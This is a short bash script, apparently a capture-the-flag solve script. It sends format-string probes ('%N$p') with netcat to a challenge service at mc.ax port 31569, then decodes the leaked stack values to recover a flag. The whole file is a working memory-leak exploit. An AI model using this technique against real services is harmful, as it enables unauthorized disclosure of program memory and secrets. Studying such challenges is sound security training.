#!/bin/bash

for ((i=70;;i++)) {
	B=$(echo 'please %'$i'$p' | nc mc.ax 31569 | grep please | awk '{print $2}')
	if echo $B | grep '7d' >/dev/null 2>&1
	then
		echo $B | sed 's/.*7d/7d/' | xxd -r -p | rev; echo
		break
	fi
	echo $B | awk -Fx '{print $2}' | xxd -r -p | rev
}

